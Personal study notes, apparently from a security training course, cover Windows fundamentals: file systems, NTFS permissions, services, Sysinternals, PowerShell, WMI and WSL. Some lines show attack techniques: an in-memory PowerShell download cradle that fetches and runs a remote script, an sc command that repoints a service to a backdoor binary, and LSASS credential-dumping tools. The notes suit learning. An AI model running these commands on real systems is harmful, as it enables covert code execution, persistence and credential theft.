![](attachments/Pasted%20image%2020250822152251.png)

## introduction to windows

- Windows operating system on November 20, 1985. The first version of Windows was a graphical operating system shell for MS-DOS
- Windows 95 was the first full integration of Windows and DOS and offered built-in Internet support for the first time.

the names in the table is well known but the version number is how the os identifies 

|Operating System Names|Version Number|
|---|---|
|Windows NT 4|4.0|
|Windows 2000|5.0|
|Windows XP|5.1|
|Windows Server 2003, 2003 R2|5.2|
|Windows Vista, Server 2008|6.0|
|Windows 7, Server 2008 R2|6.1|
|Windows 8, Server 2012|6.2|
|Windows 8.1, Server 2012 R2|6.3|
|Windows 10, Server 2016, Server 2019|10.0|

```
To find the info of the os (this will query WMI)

> Get-WmiObject
> Get-WmiObject -Class win32_OperatingSystem
# there are many other info we can use Win32_Process,Win32_Service, Win32_Bios 
```

**WMI = Windows Management Instrumentation**
- its a database that stores system info like os details, processes, services, hardware ...

[more info artical on Get-WmiObject ](https://adamtheautomator.com/get-wmiobject/)
[dictionary](https://ss64.com/ps/get-wmiobject.html)

#### accessing windows
- local access 
- remote access ( accessing a computer over a network)
	- Remote Desktop Protocol (RDP)
		- client server model
		- <span style="color:rgb(0, 176, 80)">3389</span> port
		- built-in RDP client application called `Remote Desktop Connection` ([mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)).
		- -When connected, you can **see the desktop, open apps, files, and use network resources** just like you were sitting at that computer.
		- If you don’t need remote access, **don’t enable it** (because it opens a potential security hole).
		- Enabling Remote Desktop means:
		- Windows opens a **network port (TCP 3389)** so other devices can connect.
		- It’s safer to enable it **only in trusted networks**
		- Remote Desktop Connection also allows us to save connection profiles. As pentesters, we can benefit from looking for these saved Remote Desktop Files (`.rdp`) while on an engagement.
		- From a Linux-based attack host we can use a tool called [xfreerdp](https://linux.die.net/man/1/xfreerdp) to remotely access Windows targets.
		- `xfreerdp /v:<targetIP> /u:htb-student /p:Password`

---
---

## Operating System Structure

 - root directory is `<drive_letter>:\ (commonly C drive)`

### windows Boot Partition Directory Structure

|📁 Directory|📝 Description|💡 Example Use Case|🔗 Emoji Memory Aid|
|---|---|---|---|
|**Perflogs**|Stores performance logs (empty by default).|Windows admin runs a performance trace → logs go here.|📊 (performance charts)|
|**Program Files**|On 32-bit Windows → all apps here. On 64-bit Windows → **only 64-bit apps**.|Installing 64-bit Google Chrome → stored here.|⚙️ (big system apps)|
|**Program Files (x86)**|On 64-bit Windows → for **32-bit apps**.|Installing 32-bit Adobe Reader → stored here.|🏗️ (compatibility / old apps)|
|**ProgramData**|Hidden folder, contains shared data required by programs. Accessible to all users.|Antivirus keeps global config files here.|📦 (shared resources)|
|**Users**|Contains all user profiles.|`C:\Users\Alice\` → Alice’s desktop, docs, downloads.|👤 (user accounts)|
|**Default**|Template user profile. New users copy settings from here.|New account created → starts with settings from **Default**.|🧑‍🎓 (default student template)|
|**Public**|Shared folder for all users (and across network if allowed).|Copy a movie to **Public** → all users on PC can access.|🌍 (public sharing)|
|**AppData**|Hidden per-user app settings. Contains **Roaming, Local, LocalLow**.|Browser stores bookmarks in Roaming, cache in Local.|🗂️ (personal app settings)|
|**Windows**|Main OS directory, contains the core of Windows.|Windows boot files & updates installed here.|🪟 (Windows itself)|
|**System, System32, SysWOW64**|Core DLLs, drivers, APIs. System always checks here when a program asks for a DLL.|Running `cmd.exe` or `notepad.exe` → both are in System32.|🧩 (system pieces)|
|**WinSxS**|Windows Component Store (all updates, service packs, DLL versions).|Updating Windows → stores multiple versions of DLLs in WinSxS.|🗃️ (library archive)|

```
# show all the files in c and /a for hidden files
>dir c:\ /a
---------------------------------------------------------------------------------------
# tree is used to shoe the tree structure
>tree "c:\Program Files"
-------------------------------------------------------------------------------------
# show tree structure /f include file names as well not just folders and |more like we can view more if we want
>tree c:\ /f | more
```

----
---

## File System

| 🖇️ File System   | 📝 Description                                                                    | ✅ Pros                                                                                                                                         | ❌ Cons                                                                    | 💡 Example Use Case                                      | 🔗 Emoji Memory Aid       |
| ----------------- | --------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- | -------------------------------------------------------- | ------------------------- |
| **FAT12 / FAT16** | Very old (floppy disks, early DOS/Windows). Not used anymore.                     | Worked on early systems.                                                                                                                       | Obsolete, tiny storage limits.                                            | Floppy disks, early MS-DOS PCs.                          | 💾 (floppy disk)          |
| **FAT32**         | File Allocation Table (32-bit cluster identifiers). Still used for compatibility. | - Works on almost **all devices** (PCs, phones, consoles, cameras).- Cross-platform (Windows, Mac, Linux).                                     | - Max file size = **4GB**.- No permissions, no journaling, no encryption. | USB drives, SD cards, external HDDs (for compatibility). | 📸 (camera / memory card) |
| **exFAT**         | “Extended FAT” — modern version of FAT32 (designed for flash drives).             | - Supports **big files (>4GB)**.- Lightweight, cross-platform.- Better for flash memory.                                                       | - No advanced features like NTFS.- Not as universally supported as FAT32. | Large USB sticks, SDXC cards for cameras/video.          | 📀 (removable media)      |
| **NTFS**          | Default Windows file system since NT 3.1. Advanced, reliable, secure.             | - Journaling = safer from crashes.- Supports **permissions** & encryption.- Handles very large files & drives.- Better metadata & performance. | - Not supported by many devices (phones, TVs, cameras).                   | Windows system drive (C:), business servers.             | 🖥️ (Windows PC)          |

- **NTFS** is will store all the data like a record in the database
- if we create a file `C:\Users\admin\hello.txt` then all the data like date, time , who created the file, how it is created all those record is recorded in the data base called **master file table** (MFT)

### NTFS Permissions

- NTFS allows you to **control who can access files and folders** and what they can do with them.

|🛠️ Permission|📖 Description|💻 Example Use Case|
|---|---|---|
|🔑 **Full Control**|Can **read, write, modify, delete, and change permissions**|Admin on `C:\Projects\` who must manage all files|
|✏️ **Modify**|Can read, write, and delete files/folders|Developer can edit code files in `C:\Code\`|
|📂 **List Folder Contents**|Can view folder structure & execute files (folders only)|User can see `C:\Public\Docs\` list but not change files|
|▶️ **Read & Execute**|Can open and run files, view folders|User can run `app.exe` but not edit it|
|📝 **Write**|Can create files/folders and write to them|User can save new reports in `C:\Reports\`|
|👀 **Read**|Can only view files/folders and open them|Guest can only open `C:\Shared\ReadOnly.txt`|
|🚪 **Traverse Folder**|Can pass through folders to reach a file (even if listing is denied)|Path: `C:\Users\bsmith\Documents\WebApps\Backups\backup.zip` → user can’t see `Documents\WebApps\`, but still open `backup.zip` if allowed|
- by default the folder/files will inherit the permission form the parent folder

### NTFS Permissions with `icacls`

- Windows command-line tool for managing **NTFS permissions**.
- It’s the CLI alternative to the **File Explorer → Right click → Properties → Security tab**.


| Command                            | Description             |
| :--------------------------------- | :---------------------- |
| `icacls C:\Windows`                | listing permission      |
| `icacls C:\Users /grant joe:F`<br> | granting the permission |
| `icacls C:\Users /remove joe`<br>  | revoking the permission |

#### Common Permission Flags

| Symbol | Meaning        |
| ------ | -------------- |
| **F**  | Full control   |
| **M**  | Modify         |
| **RX** | Read & Execute |
| **R**  | Read-only      |
| **W**  | Write-only     |
| **D**  | Delete         |
| **N**  | No access      |
#### Inheritance Flags

| Flag     | Meaning                                                             |
| -------- | ------------------------------------------------------------------- |
| **(CI)** | Container Inherit → applies to subfolders                           |
| **(OI)** | Object Inherit → applies to files                                   |
| **(IO)** | Inherit Only → permissions inherited, not applied to current object |
| **(NP)** | No Propagate → prevents inheritance beyond direct child             |
| **(I)**  | Inherited → this entry itself was inherited                         |

---
---

## NTFS vs. Share Permissions

[video that tells how to create smb share](https://www.youtube.com/watch?v=AxhSvBg0dTM)

#### Using smbclient to list available shares

```
# Using smbclient to list available shares
>smbclient -L SERVER_IP -U htb-student
----------------------------------------------------------------

#connecting to the available shares
smbclient '\\SERVER_IP\Company Data' -U htb-student

```

- By default, Windows Firewall only allows SMB connections from trusted devices
- Two layers of permission matter:
1. **Share permissions** (set on the shared folder itself, e.g., Everyone = Read).
2. **NTFS permissions** (file system-level permissions inside the folder).

#### NTFS Permissions (ACLs on Security Tab)
- NTFS permissions = **rules on files/folders** that control _who can do what_ (read, write, modify, delete, etc.).
- Permissions can be:
    - Directly set on a folder/file.
    - Or **inherited** from a parent folder (that’s why some boxes are gray).
- **C:\ drive** is like the _ultimate parent_. Most folders/files inherit from it unless the admin disables inheritance.

**Mounting**
Think of **mounting** like **attaching someone else’s folder to your computer so it looks like it’s part of your own system**.
Mounting is basically like building a **pipeline (live connection)** between:
👉 **Your Linux system** ↔ **Windows system’s filesystem (like C:\ drive or a folder)**
So when you open the mount point (shortcut folder in Linux):
- You’re actually walking straight into the Windows machine’s files.
- Nothing is copied unless _you choose to copy_.
- If the **target system goes offline**, your mount point breaks (because the “pipe” is cut).

```
sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //IP/Company Data /home/user/Desktop/
```

- `//IP/Company Data` → the Windows shared folder.
- `/home/user/Desktop/` → where you want it to appear on your Linux system.

**Viewing Shares in Windows**  `net share`
- **Computer Management → Shared Folders** → lets you see and manage all shares.
- Good for monitoring what is being shared and who can access it.

![](attachments/Pasted%20image%2020250821222742.png)

- **Shares** → shows which folders/drives are shared over the network (e.g., `C$`, `Company Data`).
- **Sessions** → shows which users are currently connected remotely to those shares (who is logged in over SMB).
- **Open Files** → shows which specific files are currently open by those users.

👉 These are very useful in **incident response**:
- If a hacker accessed files over SMB, you can check which files they touched.
- You can also see which user account was used (maybe a stolen account).

`sudo apt-get install cifs-utils`
**CIFS** (Common Internet File System) is another name for **SMB protocol** (the same thing Windows uses for file sharing).
- **`cifs-utils`** gives Linux the tools it needs to:
    - Mount Windows shares (`//WindowsPC/Share`) onto Linux.
    - Authenticate with username & password.
    - Interact with SMB/CIFS shares smoothly.
👉 Without `cifs-utils`, the `mount -t cifs` command (used to mount Windows shares in Linux) won’t work.

![](attachments/Pasted%20image%2020250821223309.png)

---
---

## Windows services and processes

- services are started at the boot and they will run in the background process
- Windows services are managed via the Service Control Manager (SCM) system, accessible via the `services.msc` MMC add-in. This add-in provides a GUI interface for interacting with and managing services and displays information about each installed service.
- MMC is microsoft management console its like a framework/container that gives system admin a central place to manage 
- `Win+R`  and type `mmc`

![](attachments/Pasted%20image%2020250822101441.png)

- in command line we can use 
- `powershell-sessionGet-Service | ? {$_.Status -eq "Running"}`
-  Windows has three categories of services:
	- Local Services
	- Network Services
	- System Services.
- critical system services that cannot be stopped and restarted without a system restart .If we update any file or resource in use by one of these services, we must restart the system.

|**Process / Service**|**Path**|**Role / Description**|**Why Critical?**|**Security Notes**|
|---|---|---|---|---|
|**smss.exe** (Session Manager)|`C:\Windows\System32\smss.exe`|First user-mode process; creates sessions, launches `csrss.exe` & `wininit.exe`.|If it fails → BSOD (Blue Screen).|Rarely targeted, but must always be present in System32.|
|**csrss.exe** (Client/Server Runtime Subsystem)|`C:\Windows\System32\csrss.exe`|Handles console windows, threads, Win32 APIs.|If killed → system crash.|Malware often impersonates it outside System32.|
|**wininit.exe** (Windows Initialization)|`C:\Windows\System32\wininit.exe`|Starts `services.exe` and `lsass.exe`; processes post-update .ini changes.|Missing = Windows boot fails.|Attackers rarely touch, but persistence possible.|
|**logonui.exe** (Logon UI)|`C:\Windows\System32\logonui.exe`|Displays login screen for user authentication.|Without it → can’t log in.|Fake logon UIs used in credential theft attacks.|
|**lsass.exe** (Local Security Authority Subsystem Service)|`C:\Windows\System32\lsass.exe`|Validates logons, enforces security policies, manages Kerberos tickets.|Killing it = reboot.|**Prime attacker target** → credential dumping (Mimikatz).|
|**services.exe** (Service Control Manager)|`C:\Windows\System32\services.exe`|Manages starting/stopping of all system services.|Failure → system unstable.|Attackers may register malicious services.|
|**winlogon.exe** (Windows Logon)|`C:\Windows\System32\winlogon.exe`|Handles Ctrl+Alt+Del, loads user profiles, locks PC when idle.|No secure login without it.|Target for password stealers & persistence.|
|**System** (Kernel process)|N/A (not a file)|Represents Windows kernel, handles memory, hardware I/O.|Stopping = BSOD crash.|Attackers use kernel drivers/rootkits.|
|**svchost.exe (RPCSS)**|`C:\Windows\System32\svchost.exe`|Runs RPC services (Remote Procedure Call).|Needed for inter-process comms.|Malware often hides as fake svchost.exe.|
|**svchost.exe (Dcom/PnP)**|`C:\Windows\System32\svchost.exe`|Runs Distributed COM + Plug & Play services.|Needed for device detection, updates.|Common disguise for malware.|

- Always check the **path** of these processes. Legit ones are in `C:\Windows\System32\`
- If they run from anywhere else (like `%TEMP%`, `Downloads`, `AppData`) → **malware alert 🚨**.

#### Processes
- Processes run in the background on Windows systems.
- They either run automatically as part of the Windows operating system or are started by other installed applications.

#### LSASS (Local Security Authority Subsystem Service)

| **Aspect**                   | **Details**                                                                                                                                                                                                                                                                                                                         |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Name / File**              | `lsass.exe` – Local Security Authority Subsystem Service                                                                                                                                                                                                                                                                            |
| **Path**                     | `C:\Windows\System32\lsass.exe`                                                                                                                                                                                                                                                                                                     |
| **Role / Function**          | - Enforces **local security policy** (password rules, lockout policy, Kerberos, NTLM, etc.)- Authenticates **user logons** (local & domain).- Issues **access tokens** (used by processes to prove their identity).- Handles **password changes**.- Logs **logon/logoff events** into the **Security Event Log**.                   |
| **Importance**               | - If LSASS crashes or is killed → **Windows will immediately reboot**.- It is essential for authentication, without it users can’t log in.                                                                                                                                                                                          |
| **Security Logs**            | - Writes to **Windows Security Log** (`Event Viewer → Windows Logs → Security`).- Important events: • Event ID **4624** – Successful logon • Event ID **4625** – Failed logon • Event ID **4634** – Logoff • Event ID **4672** – Special privileges assigned (like admin logon).                                                    |
| **Why Attackers Love It ❤️** | - Stores credentials in **memory** (cleartext, NTLM hashes, Kerberos tickets).- Attackers can dump credentials using tools like: • **Mimikatz** • **ProcDump** • **comsvcs.dll** trick.- With LSASS dump, attackers can move laterally across the network with stolen credentials (**Pass-the-Hash**, **Pass-the-Ticket**).         |
| **Defense / Monitoring**     | ✅ Monitor for suspicious access to `lsass.exe` memory.✅ Look for unusual processes trying to read LSASS (e.g., `procdump.exe`, `taskmgr.exe` with odd command line).✅ Enable **Credential Guard** (Windows 10/11 Enterprise).✅ Restrict admin rights (only admins can dump LSASS).✅ Monitor Event IDs related to suspicious logons. |

### Sysinternals Tools

this are inbuilt tools for monitoring and managing the services admins, red team and DFTI team are used for there own prepuces

|**Category**|**Tool**|**Purpose / Use Case**|
|---|---|---|
|**Process & System Monitoring**|**Process Explorer (procexp.exe)**|Like Task Manager on steroids. Shows process tree, DLLs loaded, handles in use, digital signatures. Useful for spotting suspicious processes.|
||**Process Monitor (procmon.exe)**|Captures **real-time file, registry, network, and process activity**. Great for malware analysis or troubleshooting what a process is touching.|
||**ProcDump (procdump.exe)**|Dumps process memory. Often used by attackers to dump `lsass.exe` for credential theft.|
|**Network Tools**|**TCPView (tcpview.exe)**|Shows all open TCP/UDP connections and which process is using them. Helps spot suspicious network activity.|
||**PsPing**|Tests network latency, bandwidth, TCP/UDP availability.|
|**Remote Admin Tools (PsTools)**|**PsExec**|Execute commands on remote systems via SMB. Often abused for **lateral movement**.|
||**PsList**|Lists processes on a local or remote system.|
||**PsKill**|Kills processes locally or remotely.|
||**PsService**|Query or control services on local/remote systems.|
|**Security & Investigation**|**Autoruns (autoruns.exe)**|Shows all auto-starting apps, services, scheduled tasks, drivers, etc. Ideal for hunting persistence mechanisms.|
||**AccessChk**|Shows effective permissions on files, folders, registry keys. Helps identify privilege escalation paths.|
||**Sigcheck**|Verifies digital signatures on binaries and checks them against VirusTotal.|
|**System Utilities**|**BgInfo**|Displays system info (hostname, IP, OS, etc.) on the desktop wallpaper.|
||**Desktops**|Allows multiple virtual desktops on Windows.|
if we need to run any tools we can run it with shares no need to download
```cmd
C:\htb> \\live.sysinternals.com\tools\procdump.exe -accepteula
```


### Task manager

**Keyboard Shortcuts** →
- `Ctrl + Shift + Esc`

#### task manager tabs

|**Tab**|**Description**|**Use Case / Why Important**|
|---|---|---|
|**Processes**|Shows apps & background processes with CPU, Memory, Disk, Network, and Power usage.|Identify high-resource processes, kill suspicious tasks.|
|**Performance**|Real-time graphs of CPU, RAM, Disk, Network, GPU usage. Also shows system uptime.|Quick system health check. Can launch **Resource Monitor** for deeper analysis.|
|**App history**|Tracks resource usage per app for the current user over time.|Identify which apps consumed most CPU/Network in the past.|
|**Startup**|Lists apps that run at boot + their startup impact.|Control boot performance, check for persistence malware.|
|**Users**|Shows logged-in users and their processes + resource usage.|Detect suspicious user sessions, multi-user activity.|
|**Details**|Advanced view: process name, PID, status, username, CPU, memory usage.|Useful for malware hunting, process analysis (like in Sysinternals).|
|**Services**|Displays installed services, their PID, description, and status. Can open **Services.msc**.|Check if critical services are running, investigate unknown services.|
![](attachments/Pasted%20image%2020250822110158.png)


#### Resource monitor

|**Tab**|**Description**|**Why Useful**|
|---|---|---|
|**CPU**|Per-process CPU usage, threads, handles.|Spot malware using spikes in CPU.|
|**Memory**|Memory usage per process, page faults, committed memory.|Detect memory-heavy suspicious processes.|
|**Disk**|Active disk I/O per process.|Identify ransomware writing heavily to disk.|
|**Network**|Active network connections per process.|Spot suspicious outbound traffic (C2 servers, exfiltration).|
![](attachments/Pasted%20image%2020250822110353.png)

### Process Explorer

[Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) is a part of the Sysinternals tool suite. This tool can show which handles and DLL processes are loaded when a program runs. Process Explorer shows a list of currently running processes, and from there, we can see what handles the process has selected in one view or the DLLs and memory-swapped files that have been loaded in another view.

We can also search within the tool to show which processes tie back to a specific handle or DLL

we can analyze parent child process relationship

---
---

## Service Permissions
- Services run with **specific user accounts** (Local System, Local Service, Network Service, or custom accounts).
- **Misconfigured permissions** = major attack surface.

#### Examining Services with **services.msc**

GUI tool for viewing & managing **Windows Services**.
`win + R` -> `services.msc`

![](attachments/Pasted%20image%2020250822115807.png)

|**Property**|**Description**|**Security Implication**|
|---|---|---|
|**Service Name**|Short name used in CLI (e.g., `wuauserv`).|Needed for commands like `sc` or `net`.|
|**Display Name**|Friendly name (e.g., “Windows Update”).|Easy to identify in GUI.|
|**Description**|Explains service purpose.|Helps in analysis.|
|**Path to Executable**|Full path to binary that runs (e.g., `C:\Windows\system32\svchost.exe -k netsvcs`).|🔴 If NTFS permissions are weak → attacker could replace binary with malicious file.|
|**Startup Type**|Automatic, Manual, Disabled.|Misuse can enable persistence.|
|**Service Status**|Running / Stopped.|Monitoring point.|
|**Log On As**|Which account runs the service (LocalSystem, NetworkService, etc.).|🔴 Over-privileged accounts → privilege escalation risk.|
|**Dependencies**|Other services required.|Attacker could target weak dependencies.|
|**Recovery Tab**|What happens if service fails (restart service, run program, etc.).|🔴 Misused to run attacker’s program for persistence.|

#### Built in service accounts

|**Account**|**Privilege Level**|**Typical Usage**|**Risks if Misused**|
|---|---|---|---|
|**LocalSystem**|Highest privilege on local machine (NT AUTHORITY\SYSTEM).|Core OS services.|Full system compromise if hijacked.|
|**NetworkService**|Limited local privileges, but uses machine account when accessing network resources.|Services needing network comms.|Can be used for lateral movement if creds abused.|
|**LocalService**|Very limited local + anonymous credentials for network.|Services that don’t need elevated access.|Safer for least privilege, but still exploitable if misconfigured.|
#### Examining Services with **sc**

Command-line utility to **query, configure, start/stop, and manage services**.

**Commands in sc**

|**Command**|**Purpose**|**Example**|
|---|---|---|
|`sc qc <ServiceName>`|Query service config (binary path, account, type, dependencies).|`sc qc wuauserv`|
|`sc query <ServiceName>`|Query current status (running/stopped).|`sc query wuauserv`|
|`sc \\HOSTNAME query <ServiceName>`|Query a service remotely.|`sc \\10.10.10.5 query wuauserv`|
|`sc stop <ServiceName>`|Stop service (needs admin).|`sc stop wuauserv`|
|`sc start <ServiceName>`|Start service.|`sc start wuauserv`|
|`sc config <ServiceName> binPath= <path>`|Reconfigure the binary path for the service (persistence/abuse vector).|`sc config wuauserv binPath= C:\Windows\backdoor.exe`|
|`sc sdshow <ServiceName>`|Show service permissions in **SDDL** format.|`sc sdshow wuauserv`|

**Security Descriptor Definition Language**
Every Windows service is a **securable object**, and `sc sdshow` reveals its **security descriptor**

example
`D:(A;;CCLCSWRPLORC;;;AU)`

| **SDDL Component**          | **Meaning**                                      |
| --------------------------- | ------------------------------------------------ |
| **D:**                      | Refers to **DACL** (permissions for the object). |
| **A**                       | Access allowed (D = Deny).                       |
| **;; rights ;;; principal** | Format for Access Control Entry (ACE).           |
| **Rights**                  | 2-letter codes representing service permissions. |
| **Principal**               | The user or group (AU, BA, SY, WD, etc.).        |

**Common Principles**

| **Code** | **Principal**           |
| -------- | ----------------------- |
| **AU**   | Authenticated Users     |
| **BA**   | Built-in Administrators |
| **SY**   | Local System            |
| **WD**   | Everyone (World)        |

**Common permissions (rights)**

|**Code**|**Full Name**|**Action**|
|---|---|---|
|**CC**|SERVICE_QUERY_CONFIG|Query service config|
|**LC**|SERVICE_QUERY_STATUS|Query service status|
|**SW**|SERVICE_ENUMERATE_DEPENDENTS|Enumerate dependent services|
|**RP**|SERVICE_START|Start the service|
|**LO**|SERVICE_INTERROGATE|Query current state|
|**RC**|READ_CONTROL|Read service security descriptor|
|**WP**|SERVICE_STOP|Stop the service|
|**DT**|DELETE|Delete the service|
|**WDWO**|WRITE_DAC / WRITE_OWNER|Change permissions/ownership|
#### Examining Service Permissions with PowerShell

- `sc sdshow` → shows **raw SDDL only** (harder to read).
- PowerShell `Get-Acl` → shows both **human-readable permissions + SDDL + SIDs**.
- PowerShell = **object-based**, meaning you can filter, export, and script checks easily across many machines.

```powershell
Get-Acl -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
```

- **KLM** = the registry hive `HKEY_LOCAL_MACHINE`
- **System\CurrentControlSet\Services\wuauserv** = registry path for the **Windows Update service**
- **wuauserv** = the service itself (Windows Update)
- Using **Get-Acl** on this path = **viewing the permissions/ACL of the service in the registry**, i.e., who can read, modify, or control it.

---
---

## Windows Sessions

Windows sessions are **ways users or accounts “log in”** to a system.

|**Session Type**|**Description**|**Example / Use Case**|**Emoji**|
|---|---|---|---|
|**Interactive**|User logs in manually or via Remote Desktop.|Logging in at the PC, `runas` command, RDP session.|👤💻|
|**Non-Interactive**|Accounts that **don’t require manual login**; used by OS to run services automatically.|Windows services starting at boot, scheduled tasks.|🤖|

**Non-Interactive Accounts**

- local system (system)
- local service
- network service

---
---

## Interacting with the windows operating system

#### Graphical user interface
#### Remote Desktop protocol (RDP)
- [RDP](https://support.microsoft.com/en-us/help/186607/understanding-the-remote-desktop-protocol-rdp)
- use 3389 prot
#### windows command line
- The [Windows Command Reference](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) from Microsoft is a comprehensive A-Z command reference which includes an overview, usage examples, and command syntax for most Windows commands, and familiarity with it is recommended.

#### CMD
- `C:\Windows\system32\cmd.exe
- `> help ` will list all available commands or we can specific command `help <command name>`
- some command will not have the help menu so we can use   get info  `> command /? `

#### Power shell
- command shell + scripting language
- it is built on .NET framework 
- its object based its structured 

#### Cmdlets
- small single purpose commands in powershell
- always in `Verb-Noun`

| Cmdlet          | Purpose                              | Example                  |
| --------------- | ------------------------------------ | ------------------------ |
| `Get-ChildItem` | List files/folders (like `ls`/`dir`) | `Get-ChildItem -Recurse` |
| `Get-Process`   | Show running processes               | `Get-Process             |
| `Start-Service` | Start a Windows service              | `Start-Service wuauserv` |
| `Stop-Computer` | Shut down computer                   | `Stop-Computer -Force`   |

they are building blocks of powershell consistent object-based easy to chain and way more powerful than traditional commands

#### Aliases in PowerShell
- Aliases are **alternative names** (shortcuts) for cmdlets, functions, or scripts.
- `Get-ChildItem` → has aliases `ls`, `dir`, `gci`.
- `Set-Location` → has aliases `cd`, `sl`
- so we can see all the aliases with `Get-Alias`
- to crate new aliases `New-Alias -Name "Show-Files" Get-ChildItem` now typing "Show-Files" will work like `Get-ChildItem`
- to check what a specific alias points we can use `Get-Alias -Name Show-Files`

to see help in powershell 
`Get-Help Get-Process`

in power shell partial help is installed to open full online documentation in browser
`Get-Help Get-Process -Online`

to download and install full help locally 
`Update-Help`

#### Running Powershell scripts

- **powershell ISE** (integrated scripting environment) its a gui toll for writhing, editing and running powershell scripts
- **running a script directly** we can run it like this `> .\PowerView.ps1`
- **Importing Script modules** instead of executing the whole script every time we can load it as a module so all its function become available in our current session 
`Import-Module .\PowerView.ps1`
- to check which module are loaded and what commands they provide
`Get-Module | Select Name, ExportedCommands |fl`

- **Download Cradle (advanced usage)** attackers or admins sometimes load scripts directly into memory without saving them on disk (to avoid detection or for convenience)
```
IEX (New-Object Net.WebClient).DownloadString("http://example.com/PowerView.ps1")
```

#### Execution Policy 

PowerShell controls whether scripts can run and if they need to be signed. It’s **not a true security control**—it mainly stops accidental execution of untrusted scripts.

|Policy|Description|Example / Use Case|
|---|---|---|
|**Restricted**|No scripts can run; only individual commands are allowed. Default for desktops.|Default Windows desktop policy; prevents accidental script execution.|
|**AllSigned**|Scripts can run only if signed by a trusted publisher. Prompts for unknown publishers.|Running enterprise scripts with verified signatures.|
|**RemoteSigned**|Local scripts run without signing; scripts from the internet require a digital signature. Default for Windows servers.|Running downloaded scripts safely while allowing local scripts.|
|**Unrestricted**|All scripts run; warns only for scripts from the internet.|Running any script on non-Windows systems.|
|**Bypass**|No restrictions; scripts run without warnings or prompts.|Temporary testing or lab environments.|
|**Undefined**|No execution policy is set for the scope; defaults to Restricted if all scopes are undefined.|Used when no policy is configured; system falls back to default.|

`Set-ExecutionPolicy Bypass -Scope Process` this will override the policy for a session
This specifies **where the policy applies**. `Process` means it only affects the **current PowerShell session** (memory). Once you close the session, the policy reverts to the previous one.

list the policy present 
```powershell
Get-ExecutionPolicy -List
```

---
---

## windows management instrumentation (WMI)

- it like a remote control system built on every windows computer . it lets us to ask questions regarding the applications or we can tell them what to do
- WMI is used only of managing and querying system info

|Component|Analogy|What it does in real life|
|---|---|---|
|**WMI service**|The **house manager**|Runs in the background, listens to your requests, talks to appliances (providers).|
|**Managed objects**|The **appliances** in your smart home|Things you can control: processes, files, OS, users, disks.|
|**WMI providers**|The **smart plugs/sensors**|Each provider monitors one type of object (CPU provider, disk provider, etc.).|
|**Classes**|The **blueprints**|Standard way of describing an object (e.g., `Win32_OperatingSystem` = OS info).|
|**Methods**|The **buttons on the remote**|Actions you can take (start/stop process, rename file).|
|**WMI repository**|The **instruction manual library**|Stores static data about system configuration.|
|**CIM Object Manager (CIMOM)**|The **dispatcher**|Delivers your request to the right provider and gives back results.|
|**WMI API**|The **remote control app on your phone**|Lets programs/scripts use WMI.|
|**WMI consumer**|**You, the homeowner**|Sends queries like “Tell me system info” or “Do X action.”|

**WMIC (Command Prompt tool)** → Like talking through walkie-talkie 📻

`wmic os list brief`
gives os info quickly

**PowerShell cmdlets** → Like using a smartphone app 📱
`Get-WmiObject -Class Win32_OperatingSystem | Select Version,BuildNumber`
same get the os info

**Invoke-WmiMethod** → Like pressing “action buttons” 🎛️
`Invoke-WmiMethod -Path "CIM_DataFile.Name='C:\test.txt'" -Name Rename -ArgumentList "C:\renamed.txt"`
Renames a file remotely or locally.

**Running WMI in different pc**
`Get-WmiObject -Class Win32_OperatingSystem -ComputerName "PC2"`

**Use case**
✅ See status of systems (OS, CPU, memory, users).  
✅ Configure security settings remotely.  
✅ Add/remove users.  
✅ Start/stop processes.  
✅ Schedule tasks.  
✅ Collect logs.  
✅ Blue team uses it for monitoring.  
✅ Red team uses it for stealthy attacks (lateral movement, code execution).

---
---

## Microsoft Management Console (MMC)

MMC is an **empty toolbox** (the console). You fill it with **tools** (called _snap-ins_) to manage Windows things—services, logs, disks, users, certificates—**on your PC or on other PCs/servers**.
- **MMC (the box)** = the frame/window.
- **Snap-ins (the tools)** = Event Viewer, Services, Device Manager, etc.
- **.msc file** = your **saved toolbox layout** so you can open the same tools next time with one double-click.

we can only use win services and default application to run 

we can search `mmc` and we can run it can also be run remotly

![](attachments/Pasted%20image%2020250824232927.png)

explore the tool

---
---
## windows subsystem for linux (WSL)

Microsoft built **WSL**, which lets you run **Linux commands and tools inside Windows, without a full virtual machine**.

| Command                                                                                    | Description                                                |
| :----------------------------------------------------------------------------------------- | :--------------------------------------------------------- |
| `wsl --install`                                                                            | installing wsl we can enable it with poweshell (admin)<br> |
| `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux<br>` | enable wsl manually                                        |
| `.tar`                                                                                     | install any linux system form microsoft store              |
| `C:\` in Windows = `/mnt/c/` in Linux<br>example<br>`cd /mnt/c/Users/YourName/Desktop`<br> | Access Windows drives inside Linux under `/mnt/`           |
| `notepad.exe myfile.txt`<br>                                                               | can even **run Windows commands inside WSL**               |

```powershell
# Install WSL with Ubuntu
wsl --install -d Ubuntu

# Launch Ubuntu
wsl

# Inside Ubuntu shell
sudo apt update && sudo apt install nmap -y
nmap -sV 192.168.1.1   # Scan a device on the network

# Switch back to Windows path
cd /mnt/c/Users/YourName/Desktop
ls

```

---
---
## Desktop Experience vs. Server Core

**Desktop Experience** → For admins who prefer GUI and when apps need it.
**Server Core** → For production environments where performance, stability, and security are more important.

#### Applications (Key Differences)

| Application / Tool             | Server Core     | Desktop Experience |
| ------------------------------ | --------------- | ------------------ |
| Command Prompt                 | ✅ Available     | ✅ Available        |
| PowerShell / .NET              | ✅ Available     | ✅ Available        |
| Registry Editor (regedit)      | ✅ Available     | ✅ Available        |
| Disk Management (diskmgmt.msc) | ❌ Not Available | ✅ Available        |
| Server Manager                 | ❌ Not Available | ✅ Available        |
| MMC console                    | ❌ Not Available | ✅ Available        |
| Event Viewer (eventvwr)        | ❌ Not Available | ✅ Available        |
| Services (services.msc)        | ❌ Not Available | ✅ Available        |
| Control Panel                  | ❌ Not Available | ✅ Available        |
| File Explorer (explorer.exe)   | ❌ Not Available | ✅ Available        |
